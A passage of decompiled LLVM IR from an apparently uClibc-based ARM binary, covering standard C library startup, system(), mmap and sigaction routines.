dec_label_pc_18044.dec_label_pc_18044_crit_edge:  ; preds = %dec_label_pc_18044
  %v3_18044.pre = load i32, i32* %stack_var_-32, align 4
  br label %dec_label_pc_18044

dec_label_pc_18060:                               ; preds = %dec_label_pc_18044
  %v2_18064 = load i32, i32* @global_var_34678.1540, align 4
  store i32 %v2_18064, i32* @r2, align 4
  %v0_18068 = call i32 @__GI_execve()
  ret i32 %v0_18068

; uselistorder directives
  uselistorder i32 %v5_18058, { 1, 0 }
  uselistorder i32 %v0_1804c, { 1, 0 }
  uselistorder i32 %v1_18018, { 0, 2, 1 }
  uselistorder i32 %v1_1800c, { 1, 0 }
  uselistorder i32 %v3_18004, { 1, 0 }
  uselistorder i32 %v2_17ff8, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 0 }
}

define i32 @__pthread_return_0(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer() local_unnamed_addr {
entry:
  %v0_18088 = load i32, i32* @r0, align 4
  %v1_18088 = inttoptr i32 %v0_18088 to i32*
  %v2_18088 = load i32, i32* @r1, align 4
  store i32 %v2_18088, i32* %v1_18088, align 4
  %v3_18088 = add i32 %v0_18088, 4
  %v4_18088 = inttoptr i32 %v3_18088 to i32*
  %v5_18088 = load i32, i32* @r2, align 4
  store i32 %v5_18088, i32* %v4_18088, align 4
  %v1_1808c = load i32, i32* @r0, align 4
  ret i32 %v1_1808c
}

define i32 @_pthread_cleanup_pop_restore() local_unnamed_addr {
entry:
  %v0_18090 = load i32, i32* @r1, align 4
  %v2_18090 = icmp eq i32 %v0_18090, 0
  br i1 %v2_18090, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v0_18098 = load i32, i32* @r0, align 4
  ret i32 %v0_18098

bb2:                                              ; preds = %entry
  store i32 98476, i32* @lr, align 4
  %v3_180a8 = call i32 @unknown_0()
  ret i32 %v3_180a8
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_180dc:
  %stack_var_-12 = alloca i32, align 4
  %v3_180b0 = load i32, i32* @r4, align 4
  store i32 %v3_180b0, i32* %stack_var_-12, align 4
  %v2_180e0 = load i32, i32* @global_var_34680.1545, align 4
  %v2_180e4 = icmp eq i32 %v2_180e0, 0
  br i1 %v2_180e4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_180dc
  call void @__pseudo_branch(i32 %v2_180e0)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_180dc, %bb
  %v2_180f4 = load i32, i32* @global_var_34684.1547, align 4
  %v2_180f8 = icmp eq i32 %v2_180f4, 0
  br i1 %v2_180f8, label %bb13, label %bb14

bb13:                                             ; preds = %.thread
  %v3_180fc = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_180fc, i32* @r4, align 4
  %v12_180fc = load i32, i32* @r0, align 4
  ret i32 %v12_180fc

bb14:                                             ; preds = %.thread
  call void @__pseudo_branch(i32 %v2_180f4)
  %v2_18108 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18108, i32* @r4, align 4
  %v11_18108 = load i32, i32* @r0, align 4
  ret i32 %v11_18108

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1811c = load i32, i32* @r4, align 4
  store i32 %v3_1811c, i32* %stack_var_-12, align 4
  %v6_1811c = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_1812c = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v7_18130 = icmp eq i32 %v2_1812c, -1
  br i1 %v7_18130, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_18134 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_18134, i32* @r4, align 4
  store i32 %v6_1811c, i32* @r5, align 4
  ret i32 %v2_1812c

bb4:                                              ; preds = %entry
  %v0_18138 = load i32, i32* @r4, align 4
  %v4_18140 = call i32 @__GI_open(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_253a0.1550, i32 0, i32 0), i32 %v0_18138)
  %v1_18144 = load i32, i32* %r5.global-to-local, align 4
  %v9_18144 = icmp eq i32 %v4_18140, %v1_18144
  br i1 %v9_18144, label %bb5, label %bb6

bb5:                                              ; preds = %bb4
  %v3_18148 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_18148, i32* @r4, align 4
  store i32 %v6_1811c, i32* @r5, align 4
  ret i32 %v4_18140

bb6:                                              ; preds = %bb4
  %v0_1814c = call i32 @abort()
  %v0_18150 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18150, label %bb7, label %bb8

bb7:                                              ; preds = %bb6
  %v1_18150 = load i32, i32* @r2, align 4
  %v5_18150 = udiv i32 %v0_1814c, 128
  %v6_18150 = and i32 %v1_18150, %v5_18150
  store i32 %v6_18150, i32* @r5, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %bb7
  ret i32 %v0_1814c

; uselistorder directives
  uselistorder i32 %v0_1814c, { 1, 0 }
  uselistorder i32 %v2_1812c, { 1, 0 }
  uselistorder i32 %v6_1811c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_18158 = load i32, i32* @global_var_3467c.1552, align 4
  %v2_1815c = icmp eq i32 %v2_18158, 0
  br i1 %v2_1815c, label %bb2, label %bb

bb:                                               ; preds = %entry
  %v6_18164 = load i32, i32* @r0, align 4
  ret i32 %v6_18164

bb2:                                              ; preds = %entry
  store i32 4096, i32* @global_var_3467c.1552, align 4
  %v0_18190 = call i32 @_stdio_init()
  ret i32 %v0_18190
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp40 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r6, align 4
  %v1_181a4 = add i32 %tmp, 4
  %v2_181a8 = load i32, i32* %arg3, align 4
  %v3_181ac = mul i32 %arg2, 4
  %v2_181b0 = ptrtoint i32* %stack_var_-120 to i32
  %v2_181b4 = add i32 %v1_181a4, %v3_181ac
  %v9_181b8 = icmp eq i32 %v2_181b4, %v2_181a8
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg7, i32* @global_var_34674.1556, align 4
  %v0_181d8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_181d8, i32* @r8, align 4
  br i1 %v9_181b8, label %bb, label %.thread33

.thread33:                                        ; preds = %entry
  store i32 %arg6, i32* @global_var_34684.1547, align 4
  store i32 %v2_181b4, i32* @global_var_34678.1540, align 4
  store i32 120, i32* @r2, align 4
  br label %bb44

bb:                                               ; preds = %entry
  %v3_181dc = add i32 %tmp, %v3_181ac
  store i32 %v3_181dc, i32* %r3.global-to-local, align 4
  store i32 %arg6, i32* @global_var_34684.1547, align 4
  store i32 120, i32* @r2, align 4
  store i32 %v3_181dc, i32* @global_var_34678.1540, align 4
  br label %bb44

bb44:                                             ; preds = %.thread33, %bb
  %v2_181fc = bitcast i32* %stack_var_-120 to i8*
  %v3_181fc = call i32 @__GI_memset(i8* %v2_181fc, i32 0)
  %storemerge.pre = load i32, i32* @global_var_34678.1540, align 4
  br label %dec_label_pc_1820c

dec_label_pc_1820c:                               ; preds = %dec_label_pc_1820c, %bb44
  %storemerge = phi i32 [ %storemerge.pre, %bb44 ], [ %v4_1820c, %dec_label_pc_1820c ]
  %v1_1820c = inttoptr i32 %storemerge to i32*
  %v2_1820c = load i32, i32* %v1_1820c, align 4
  store i32 %v2_1820c, i32* %r3.global-to-local, align 4
  %v4_1820c = add i32 %storemerge, 4
  %v2_18210 = icmp eq i32 %v2_1820c, 0
  br i1 %v2_18210, label %dec_label_pc_1821c, label %dec_label_pc_1820c

dec_label_pc_1821c:                               ; preds = %dec_label_pc_1820c
  store i32 %v4_1820c, i32* @r4, align 4
  store i32 %v2_181b0, i32* @r5, align 4
  %v1_1824022 = inttoptr i32 %v4_1820c to i32*
  %v2_1824023 = load i32, i32* %v1_1824022, align 4
  store i32 %v2_1824023, i32* %r3.global-to-local, align 4
  %v2_1824425 = icmp eq i32 %v2_1824023, 0
  br i1 %v2_1824425, label %dec_label_pc_1824c, label %dec_label_pc_18228

dec_label_pc_18228:                               ; preds = %dec_label_pc_1821c, %dec_label_pc_18240
  %v5_1822c = phi i32 [ %v2_18240, %dec_label_pc_18240 ], [ %v2_1824023, %dec_label_pc_1821c ]
  %v2_18228 = icmp ugt i32 %v5_1822c, 13
  %v7_18228 = icmp eq i32 %v5_1822c, 14
  %v2_1822c = xor i1 %v2_18228, true
  %v3_1822c = or i1 %v7_18228, %v2_1822c
  br i1 %v3_1822c, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_18228
  %v6_1822c = and i32 %v5_1822c, 536870912
  %v7_1822c = icmp ne i32 %v6_1822c, 0
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_18228, %bb45
  %v1_18238 = phi i1 [ %v2_18228, %dec_label_pc_18228 ], [ %v7_1822c, %bb45 ]
  %v2_18230 = xor i1 %v1_18238, true
  %v3_18230 = or i1 %v7_18228, %v2_18230
  br i1 %v3_18230, label %bb47, label %dec_label_pc_18240

bb47:                                             ; preds = %bb46
  br label %dec_label_pc_18240

dec_label_pc_18240:                               ; preds = %bb46, %bb47
  call void @__pseudo_cond_branch(i1 %v3_18230, i32 ptrtoint (i32* @global_var_15840.1559 to i32))
  %v0_1823c = load i32, i32* @r4, align 4
  %v1_1823c = add i32 %v0_1823c, 8
  store i32 %v1_1823c, i32* @r4, align 4
  %v1_18240 = inttoptr i32 %v1_1823c to i32*
  %v2_18240 = load i32, i32* %v1_18240, align 4
  store i32 %v2_18240, i32* %r3.global-to-local, align 4
  %v2_18244 = icmp eq i32 %v2_18240, 0
  br i1 %v2_18244, label %dec_label_pc_1824c, label %dec_label_pc_18228

dec_label_pc_1824c:                               ; preds = %dec_label_pc_18240, %dec_label_pc_1821c
  %v1_18250 = call i32 @_dl_aux_init(i32 %v2_181b0)
  store i32 %v1_18250, i32* @r0, align 4
  %v1_18254 = call i32 @__GI___uClibc_init(i32 %v1_18250)
  store i32 %v1_18254, i32* @r0, align 4
  %v2_18260 = icmp eq i32 %tmp40, 0
  br i1 %v2_18260, label %bb48, label %bb49

bb48:                                             ; preds = %dec_label_pc_1824c
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_1824c, %bb48
  %storemerge52 = phi i32 [ 4096, %bb48 ], [ %tmp40, %dec_label_pc_1824c ]
  %v0_18270 = phi i32 [ 4096, %bb48 ], [ %tmp40, %dec_label_pc_1824c ]
  store i32 %storemerge52, i32* @r3, align 4
  %v3_18268 = icmp eq i32 %tmp39, -1
  %v8_18268 = icmp eq i32 %tmp39, -1
  store i32 ptrtoint (i32* @global_var_3467c.1552 to i32), i32* @r2, align 4
  store i32 %v0_18270, i32* @global_var_3467c.1552, align 4
  br i1 %v3_18268, label %dec_label_pc_18278, label %dec_label_pc_182a0

dec_label_pc_18278:                               ; preds = %bb49
  %v0_18278 = call i32 @getuid()
  store i32 %v0_18278, i32* @r0, align 4
  store i32 %v0_18278, i32* @r4, align 4
  %v0_18280 = call i32 @geteuid()
  store i32 %v0_18280, i32* @r0, align 4
  %v0_18284 = load i32, i32* @r4, align 4
  %v9_18284 = icmp eq i32 %v0_18284, %v0_18280
  br i1 %v9_18284, label %dec_label_pc_1828c, label %dec_label_pc_182c8

dec_label_pc_1828c:                               ; preds = %dec_label_pc_18278
  %v1_1828c = call i32 @getgid(i32 %v0_18280)
  store i32 %v1_1828c, i32* @r0, align 4
  store i32 %v1_1828c, i32* @r4, align 4
  %v0_18294 = call i32 @getegid()
  %v0_18298 = load i32, i32* @r4, align 4
  %v9_18298 = icmp eq i32 %v0_18298, %v0_18294
  br i1 %v9_18298, label %dec_label_pc_182a0, label %dec_label_pc_182c8

dec_label_pc_182a0:                               ; preds = %dec_label_pc_1828c, %bb49
  store i32 %tmp39, i32* @r2, align 4
  br i1 %v8_18268, label %dec_label_pc_182ec, label %dec_label_pc_182ac

dec_label_pc_182ac:                               ; preds = %dec_label_pc_182a0
  store i32 %tmp38, i32* @r3, align 4
  %v9_182b0 = icmp eq i32 %tmp39, %tmp38
  br i1 %v9_182b0, label %dec_label_pc_182b8, label %dec_label_pc_182c8

dec_label_pc_182b8:                               ; preds = %dec_label_pc_182ac
  store i32 %tmp37, i32* @r2, align 4
  store i32 %tmp36, i32* @r3, align 4
  %v9_182c0 = icmp eq i32 %tmp37, %tmp36
  br i1 %v9_182c0, label %dec_label_pc_182ec, label %dec_label_pc_182c8

dec_label_pc_182c8:                               ; preds = %dec_label_pc_182ac, %dec_label_pc_1828c, %dec_label_pc_18278, %dec_label_pc_182b8
  %v2_182d0 = call i32 @__check_one_fd(i32 0, i32 32768)
  %v2_182dc = call i32 @__check_one_fd(i32 1, i32 32770)
  %v2_182e8 = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_182ec

dec_label_pc_182ec:                               ; preds = %dec_label_pc_182b8, %dec_label_pc_182a0, %dec_label_pc_182c8
  %v0_182ec = load i32, i32* @r6, align 4
  %v1_182ec = inttoptr i32 %v0_182ec to i32*
  %v2_182ec = load i32, i32* %v1_182ec, align 4
  store i32 189476, i32* %r3.global-to-local, align 4
  store i32 %v2_182ec, i32* @global_var_2e424, align 4
  %v2_182f8 = load i32, i32* %v1_182ec, align 4
  store i32 %v2_182f8, i32* @r4, align 4
  %v2_182fc = icmp eq i32 %v2_182f8, 0
  br i1 %v2_182fc, label %dec_label_pc_1836c, label %dec_label_pc_18304

dec_label_pc_18304:                               ; preds = %dec_label_pc_182ec
  store i32 189484, i32* %r3.global-to-local, align 4
  store i32 %v2_182f8, i32* @global_var_2e42c, align 4
  %v2_18310 = load i32, i32* %v1_182ec, align 4
  %v4_18314 = call i32 @__GI_strrchr(i32 %v2_18310, i32 47, i32 %v2_182ec, i32 189484)
  %v2_1831c = icmp eq i32 %v4_18314, 0
  br i1 %v2_1831c, label %.thread, label %bb50

.thread:                                          ; preds = %dec_label_pc_18304
  store i32 0, i32* bitcast (i32** @global_var_2e428.1566 to i32*), align 4
  br label %dec_label_pc_1836c

bb50:                                             ; preds = %dec_label_pc_18304
  %v2_18320 = add i32 %v4_18314, 1
  store i32 %v2_18320, i32* %r3.global-to-local, align 4
  store i32 %v2_18320, i32* bitcast (i32** @global_var_2e428.1566 to i32*), align 4
  br label %dec_label_pc_1836c

dec_label_pc_1836c:                               ; preds = %dec_label_pc_182ec, %bb50, %.thread
  store i32 ptrtoint (i32* @global_var_34680.1545 to i32), i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* @global_var_34680.1545, align 4
  %v2_1836c = icmp eq i32 %v0_181d8, 0
  br i1 %v2_1836c, label %dec_label_pc_183a8, label %bb51

bb51:                                             ; preds = %dec_label_pc_1836c
  br label %dec_label_pc_183a8

dec_label_pc_183a8:                               ; preds = %dec_label_pc_1836c, %bb51
  call void @__pseudo_branch(i32 %v0_181d8)
  store i32 0, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_14360.1573 to i32), i32* %r3.global-to-local, align 4
  %v1_183bc = call i32 @__GI___errno_location()
  %v2_183c4 = inttoptr i32 %v1_183bc to i32*
  store i32 0, i32* %v2_183c4, align 4
  store i32 ptrtoint (i32* @global_var_18bc0.1575 to i32), i32* %r3.global-to-local, align 4
  %v1_183dc = call i32 @__GI___h_errno_location()
  %v2_183e4 = inttoptr i32 %v1_183dc to i32*
  store i32 0, i32* %v2_183e4, align 4
  store i32 ptrtoint (i32* @global_var_34678.1540 to i32), i32* %r3.global-to-local, align 4
  %v0_183f4 = load i32, i32* @sl, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_18400 = call i32 @__GI_exit(i32 %v0_183f4)
  ret i32 %v1_18400

; uselistorder directives
  uselistorder i32 %v2_18240, { 1, 2, 0 }
  uselistorder i1 %v2_18228, { 1, 0 }
  uselistorder i32 %v4_1820c, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_181d8, { 1, 0, 2 }
  uselistorder i32 %v3_181ac, { 1, 0 }
  uselistorder i32 %tmp39, { 1, 3, 0, 2 }
  uselistorder i32 %tmp38, { 1, 0 }
  uselistorder i32 %tmp37, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 11, 12, 7, 8, 2, 9, 10, 0, 1 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32* @global_var_34680.1545, { 0, 2, 1 }
  uselistorder i32* bitcast (i32** @global_var_2e428.1566 to i32*), { 1, 0 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 1, 0, 3, 2 }
  uselistorder i32* @global_var_34678.1540, { 4, 1, 2, 0, 3 }
  uselistorder i32* @global_var_34684.1547, { 1, 0, 2 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_183a8, { 1, 0 }
  uselistorder label %dec_label_pc_1836c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_182ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_182c8, { 3, 0, 1, 2 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_18240, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_18228, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18440 = load i32, i32* @r4, align 4
  %v0_18444 = load i32, i32* %r0.global-to-local, align 4
  %v2_18444 = icmp eq i32 %v0_18444, 0
  br i1 %v2_18444, label %bb, label %dec_label_pc_18458

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18564

dec_label_pc_18458:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18460 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18470 = call i32 @bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_18480 = call i32 @bsd_signal(i32 17, i32 0)
  store i32 %v2_18480, i32* %r0.global-to-local, align 4
  %v0_18488 = call i32 @__vfork()
  store i32 %v0_18488, i32* %r0.global-to-local, align 4
  store i32 %v0_18488, i32* @r4, align 4
  %v1_1848c = icmp slt i32 %v0_18488, 0
  br i1 %v1_1848c, label %dec_label_pc_18494, label %dec_label_pc_184c0

dec_label_pc_18494:                               ; preds = %dec_label_pc_18458
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1849c = call i32 @bsd_signal(i32 3, i32 %v2_18460)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_184a8 = call i32 @bsd_signal(i32 2, i32 %v2_18470)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_184b4 = call i32 @bsd_signal(i32 17, i32 %v2_18480)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18564

dec_label_pc_184c0:                               ; preds = %dec_label_pc_18458
  %v2_1848c = icmp eq i32 %v0_18488, 0
  br i1 %v2_1848c, label %dec_label_pc_184c4, label %dec_label_pc_18508

dec_label_pc_184c4:                               ; preds = %dec_label_pc_184c0
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_184cc = call i32 @bsd_signal(i32 3, i32 0)
  %v0_184d0 = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_184d8 = call i32 @bsd_signal(i32 2, i32 %v0_184d0)
  %v0_184dc = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_184e4 = call i32 @bsd_signal(i32 17, i32 %v0_184dc)
  store i32 ptrtoint ([8 x i8]* @global_var_253ac.1578 to i32), i32* @r0, align 4
  %v0_184f8 = load i32, i32* @r4, align 4
  %v8_184fc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_253ac.1578 to i32), i32 ptrtoint ([3 x i8]* @global_var_253b4.1580 to i32), i32 ptrtoint ([3 x i8]* @global_var_253b8.1582 to i32), i32 %v0_18444, i32 %v0_184f8)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_18504 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_18508:                               ; preds = %dec_label_pc_184c0
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18510 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_1851c = call i32 @bsd_signal(i32 2, i32 1)
  %v0_1852c = load i32, i32* @r4, align 4
  store i32 %v0_1852c, i32* %r0.global-to-local, align 4
  %v0_18530 = call i32 @wait4()
  store i32 %v0_18530, i32* %r0.global-to-local, align 4
  %v7_18534 = icmp eq i32 %v0_18530, -1
  br i1 %v7_18534, label %bb10, label %bb11

bb10:                                             ; preds = %dec_label_pc_18508
  store i32 %v0_18530, i32* %stack_var_-12, align 4
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_18508, %bb10
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_18544 = call i32 @bsd_signal(i32 3, i32 %v2_18460)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_18550 = call i32 @bsd_signal(i32 2, i32 %v2_18470)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_1855c = call i32 @bsd_signal(i32 17, i32 %v2_18480)
  %v3_18560 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_18560, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18564

dec_label_pc_18564:                               ; preds = %bb, %dec_label_pc_18494, %bb11
  %v8_18568 = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_18494 ], [ %v3_18560, %bb11 ]
  store i32 %v3_18440, i32* @r4, align 4
  ret i32 %v8_18568

; uselistorder directives
  uselistorder i32 %v0_18530, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 0, 1 }
  uselistorder i32 (i32)* @__GI__exit, { 2, 0, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_18564, { 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18578 = load i32, i32* @r4, align 4
  store i32 %v3_18578, i32* %stack_var_-12, align 4
  %v3_18584 = urem i32 %arg3, 4096
  store i32 %v3_18584, i32* @ip, align 4
  %v2_18588 = icmp eq i32 %v3_18584, 0
  br i1 %v2_18588, label %dec_label_pc_185a4, label %dec_label_pc_18590

dec_label_pc_18590:                               ; preds = %entry
  %v0_18590 = call i32 @__GI___errno_location()
  store i32 -1, i32* @r2, align 4
  %v2_1859c = inttoptr i32 %v0_18590 to i32*
  store i32 22, i32* %v2_1859c, align 4
  %v0_185d0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_185d0

dec_label_pc_185a4:                               ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_185cc, label %dec_label_pc_185bc

dec_label_pc_185bc:                               ; preds = %dec_label_pc_185a4
  %v0_185bc = call i32 @__GI___errno_location()
  %v0_185c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_185c0 = sub i32 0, %v0_185c0
  %v2_185c4 = inttoptr i32 %v0_185bc to i32*
  store i32 %v1_185c0, i32* %v2_185c4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_185cc

dec_label_pc_185cc:                               ; preds = %dec_label_pc_185a4, %dec_label_pc_185bc
  %v0_185cc = phi i32 [ %arg1, %dec_label_pc_185a4 ], [ -1, %dec_label_pc_185bc ]
  store i32 %v0_185cc, i32* @r2, align 4
  br label %dec_label_pc_185d0

dec_label_pc_185d0:                               ; preds = %dec_label_pc_18590, %dec_label_pc_185cc
  %v0_185d0 = phi i32 [ %v0_185d0.pre, %dec_label_pc_18590 ], [ %v0_185cc, %dec_label_pc_185cc ]
  %v2_185d4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_185d4, i32* @r4, align 4
  ret i32 %v0_185d0

; uselistorder directives
  uselistorder i32 %v3_18584, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_185d0, { 1, 0 }
  uselistorder label %dec_label_pc_185cc, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_185d8 = load i32, i32* @r4, align 4
  store i32 %v3_185d8, i32* %stack_var_-8, align 4
  %v0_185dc = load i32, i32* @r0, align 4
  %v0_185e0 = call i32 @__GI___errno_location()
  %v1_185e4 = sub i32 0, %v0_185dc
  %v2_185e8 = inttoptr i32 %v0_185e0 to i32*
  store i32 %v1_185e4, i32* %v2_185e8, align 4
  %v2_185f0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_185f0, i32* @r4, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %v3_185f4 = load i32, i32* @r4, align 4
  %v6_185f4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_185f8 = icmp eq i32 %arg2, 0
  %v2_185fc = ptrtoint i32* %stack_var_-36 to i32
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_185f8, label %dec_label_pc_18644, label %dec_label_pc_1860c

dec_label_pc_1860c:                               ; preds = %entry
  %v1_1860c = add i32 %arg2, 4
  %v2_1860c = inttoptr i32 %v1_1860c to i32*
  %v3_1860c = load i32, i32* %v2_1860c, align 4
  %v1_18610 = and i32 %v3_1860c, 67108864
  %v2_18610 = icmp eq i32 %v1_18610, 0
  br i1 %v2_18610, label %dec_label_pc_18618, label %dec_label_pc_18644

dec_label_pc_18618:                               ; preds = %dec_label_pc_1860c
  store i32 20, i32* @r2, align 4
  store i32 %v2_185fc, i32* @r0, align 4
  %v0_18620 = call i32 @memcpy()
  %v1_18630 = and i32 %tmp4, 4
  %v2_18630 = icmp eq i32 %v1_18630, 0
  br i1 %v2_18630, label %bb11, label %bb

bb:                                               ; preds = %dec_label_pc_18618
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_18618, %bb
  store i32 %v2_185fc, i32* @r4, align 4
  %v0_18644.pre = load i32, i32* @r5, align 4
  %v0_1864c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18644

dec_label_pc_18644:                               ; preds = %dec_label_pc_1860c, %entry, %bb11
  %v0_1864c = phi i32 [ %arg3, %dec_label_pc_1860c ], [ %arg3, %entry ], [ %v0_1864c.pre, %bb11 ]
  %v0_18648 = phi i32 [ %arg2, %dec_label_pc_1860c ], [ 0, %entry ], [ %v2_185fc, %bb11 ]
  %v0_18644 = phi i32 [ %arg1, %dec_label_pc_1860c ], [ %arg1, %entry ], [ %v0_18644.pre, %bb11 ]
  %v4_18654 = inttoptr i32 %v0_18648 to %sigaction*
  %v5_18654 = call i32 @__syscall_rt_sigaction(i32 %v0_18644, %sigaction* %v4_18654, i32 %v0_1864c, i32 8)
  store i32 %v3_185f4, i32* @r4, align 4
  store i32 %v6_185f4, i32* @r5, align 4
  ret i32 %v5_18654

; uselistorder directives
  uselistorder label %dec_label_pc_18644, { 2, 0, 1 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_18668 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_18668
}

